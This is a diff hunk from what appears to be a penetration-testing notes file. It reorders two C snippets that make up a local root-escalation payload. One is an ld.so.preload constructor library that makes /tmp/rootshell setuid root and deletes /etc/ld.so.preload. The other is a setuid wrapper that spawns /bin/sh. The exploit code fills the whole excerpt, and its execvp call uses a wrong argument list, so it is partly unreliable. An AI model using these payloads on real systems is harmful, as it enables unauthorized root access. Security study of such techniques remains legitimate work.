@@ -1385,12 +1385,14 @@ __NOTE(S)__:
       ```
       ```c
       #include <stdio.h>
-      int main(void){
-          setuid(0);
-          setgid(0);
-          seteuid(0);
-          setegid(0);
-          execvp("/bin/sh", NULL, NULL);
+      #include <sys/types.h>
+      #include <unistd.h>
+      __attribute__ ((__constructor__))
+      void dropshell(void){
+          chown("/tmp/rootshell", 0, 0);
+          chmod("/tmp/rootshell", 04755);
+          unlink("/etc/ld.so.preload");
+          printf("[+] done!\n");
       }
       ```
       ```
@@ -1402,14 +1404,12 @@ __NOTE(S)__:
       ```
       ```c
       #include <stdio.h>
-      #include <sys/types.h>
-      #include <unistd.h>
-      __attribute__ ((__constructor__))
-      void dropshell(void){
-          chown("/tmp/rootshell", 0, 0);
-          chmod("/tmp/rootshell", 04755);
-          unlink("/etc/ld.so.preload");
-          printf("[+] done!\n");
+      int main(void){
+          setuid(0);
+          setgid(0);
+          seteuid(0);
+          setegid(0);
+          execvp("/bin/sh", NULL, NULL);
       }
       ```
       ```
